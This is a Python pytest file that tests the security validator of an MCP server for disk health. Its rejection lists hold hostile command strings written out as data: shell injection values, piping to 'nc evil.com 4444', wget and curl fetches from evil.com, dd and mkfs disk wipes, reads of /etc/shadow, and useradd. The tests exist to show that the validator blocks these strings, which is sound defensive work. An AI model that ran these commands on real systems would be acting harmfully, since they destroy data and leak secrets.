"""
Security Tests for Disk Health MCP

Tests all validation logic and security controls.
Uses security components from server-management-lib.
"""

from pathlib import Path

import pytest

from server_management_lib import SecurityValidator, load_config

# ============================================================================
# Device Name Validation Tests
# ============================================================================


class TestDeviceNameValidation:
    """Test block device name validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_device_names(self):
        """Test valid device names are accepted."""
        valid_names = [
            "sda",
            "sdb",
            "sdx",
            "nvme0n1",
            "nvme1n2",
            "vda",
            "hda",
            "mmcblk0",
            "mmcblk0p1",
            "mmcblk1p2",
            "dm-0",
            "dm-15",
        ]
        for name in valid_names:
            assert self.security.validate_device_name(name) is True, (
                f"Should accept: {name}"
            )

    def test_invalid_device_names(self):
        """Test invalid device names are rejected."""
        invalid_names = [
            "",
            "sda;rm -rf /",
            "sda$(whoami)",
            "sda`id`",
            "sda'quote",
            'sda"quote',
            "sda>redirect",
            "sda|pipe",
            "sda&background",
            "sda\nnewline",
            "../../etc",
            "/dev/sda",  # Absolute path not allowed
            "sda/../etc",
            "sda$(cat /etc/shadow)",
            "a" * 33,  # Too long
            None,
            123,
            "sda ",  # Trailing space
            " sda",  # Leading space
            "sda1",  # Partition notation not valid (only whole disks)
            "nvme0",  # Missing n1 suffix
        ]
        for name in invalid_names:
            assert self.security.validate_device_name(name) is False, (
                f"Should reject: {name}"
            )


# ============================================================================
# SMART Test Type Validation
# ============================================================================


class TestSMARTTestValidation:
    """Test SMART self-test type validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_valid_test_types(self):
        """Test valid test types are accepted."""
        valid_tests = ["short", "long", "conveyance", "SHORT", "Long", "CONVEYANCE"]
        for test_type in valid_tests:
            assert self.security.validate_smart_test_type(test_type) is True

    def test_invalid_test_types(self):
        """Test invalid test types are rejected."""
        invalid_tests = [
            "destroy",
            "format",
            "wipe",
            "erase",
            "rm -rf",
            "short;rm -rf /",
            "",
            None,
        ]
        for test_type in invalid_tests:
            assert self.security.validate_smart_test_type(test_type) is False


# ============================================================================
# Command Safety Tests
# ============================================================================


class TestCommandSafety:
    """Test command safety validation."""

    def setup_method(self):
        self.security = SecurityValidator({})

    def test_safe_commands_accepted(self):
        """Test safe diagnostic commands are accepted."""
        safe_commands = [
            "smartctl -a /dev/sda",
            "smartctl -j -a /dev/sda",
            "smartctl -j -i /dev/nvme0n1",
            "smartctl -t short /dev/sda",
            "smartctl -t long /dev/sda",
            "smartctl -t conveyance /dev/sdb",
            "smartctl -l error /dev/sda",
            "smartctl -l selftest /dev/sda",
            "smartctl -c /dev/sda",
            "nvme smart-log /dev/nvme0n1",
            "nvme id-ctrl /dev/nvme0n1",
            "nvme id-ns /dev/nvme0n1",
            "nvme error-log /dev/nvme0n1",
            "nvme smart-log-add /dev/nvme0n1",
            "lsblk -d -o NAME,MODEL,SERIAL,SIZE",
            "lsblk -d --json",
            "zpool status -x",
            "zpool list",
            "zpool iostat",
            "zfs list",
            "zfs get all",
            "cat /proc/mdstat",
            "mdadm --detail /dev/md0",
            "mdadm --examine /dev/sda1",
            "iostat -x 1 1",
            "iostat -d 1 1",
        ]
        for cmd in safe_commands:
            assert self.security.is_command_safe(cmd) is True, f"Should accept: {cmd}"

    def test_dangerous_commands_blocked(self):
        """Test dangerous commands are blocked."""
        dangerous_commands = [
            "sudo smartctl -a /dev/sda",
            "smartctl -a /dev/sda; cat /etc/shadow",
            "smartctl -a /dev/sda | nc evil.com 4444",
            "smartctl -a /dev/sda $(rm -rf /)",
            "smartctl -a /dev/sda > /dev/sda",
            "smartctl -a /dev/sda && bash /tmp/evil.sh",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda",
            "fdisk /dev/sda",
            "chmod 777 /dev/sda",
            "mount /dev/sda /mnt",
            "wget http://evil.com/malware",
            "curl http://evil.com/exploit",
            "bash /tmp/evil.sh",
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "su root",
            "passwd",
            "useradd hacker",
        ]
        for cmd in dangerous_commands:
            assert self.security.is_command_safe(cmd) is False, f"Should block: {cmd}"


# ============================================================================
# Configuration Tests
# ============================================================================


class TestConfiguration:
    """Test configuration loading."""

    def test_default_config_exists(self):
        """Test default configuration is valid."""
        from server_management_lib.config import DEFAULT_CONFIG

        assert "ssh" in DEFAULT_CONFIG
        assert "host" in DEFAULT_CONFIG
        assert "prometheus" in DEFAULT_CONFIG
        assert "influxdb" in DEFAULT_CONFIG
        assert DEFAULT_CONFIG["security"]["allow_generic_commands"] is False

    def test_config_loads_example(self):
        """Test example config file loads correctly."""
        example_path = Path(__file__).parent.parent / "config.example.yaml"
        if example_path.exists():
            config = load_config(example_path)
            assert "ssh" in config
            assert "host" in config


# ============================================================================
# Tool Registration Tests
# ============================================================================


class TestToolRegistration:
    """Verify MCP tools are registered correctly."""

    def test_all_tools_registered(self):
        """All expected tools should be registered."""
        from disk_health_mcp.server import mcp

        tools = list(mcp._tool_manager._tools.keys())
        expected_tools = {
            "list_disks",
            "get_disk_health",
            "get_smart_attributes",
            "get_nvme_health",
            "run_smart_test",
            "get_zfs_status",
            "get_raid_status",
            "get_io_stats",
            "query_prometheus_disk",
            "query_influxdb_disk",
            "get_full_disk_report",
        }
        for tool in expected_tools:
            assert tool in tools, f"Missing tool: {tool}"
        assert len(tools) == len(expected_tools), (
            f"Expected {len(expected_tools)} tools, got {len(tools)}"
        )

    def test_no_generic_command_tool(self):
        """No generic command execution tool should exist."""
        from disk_health_mcp.server import mcp

        tools = list(mcp._tool_manager._tools.keys())
        assert "exec_command" not in tools
        assert "run_command" not in tools
        assert "shell" not in tools


# ============================================================================
# Run Tests
# ============================================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v"])


# ============================================================================
# Error Enrichment Tests
# ============================================================================


class TestErrorEnrichment:
    """Test smartctl/nvme privilege hint enrichment."""

    def test_privilege_error_gets_hint(self):
        """Permission denied errors should include sudo hint."""
        from disk_health_mcp.server import _enrich_error_output

        output = "smartctl: /dev/sda: Permission denied"
        result = _enrich_error_output(output)
        assert "require root privileges" in result
        assert "sudo" in result.lower()

    def test_command_not_found_gets_hint(self):
        """Command not found should include installation hint."""
        from disk_health_mcp.server import _enrich_error_output

        output = "bash: smartctl: command not found"
        result = _enrich_error_output(output)
        assert "Hint" in result

    def test_unable_to_open_gets_hint(self):
        """Unable to open device should include privilege hint."""
        from disk_health_mcp.server import _enrich_error_output

        output = "Unable to open /dev/sda: Operation not permitted"
        result = _enrich_error_output(output)
        assert "require root privileges" in result

    def test_clean_output_unchanged(self):
        """Normal output should not be modified."""
        from disk_health_mcp.server import _enrich_error_output

        output = "smartctl 7.4, JSON output follows"
        result = _enrich_error_output(output)
        assert result == output

    def test_access_denied_gets_hint(self):
        """Access denied should include privilege hint."""
        from disk_health_mcp.server import _enrich_error_output

        output = "NVMe: access denied for /dev/nvme0n1"
        result = _enrich_error_output(output)
        assert "require root privileges" in result
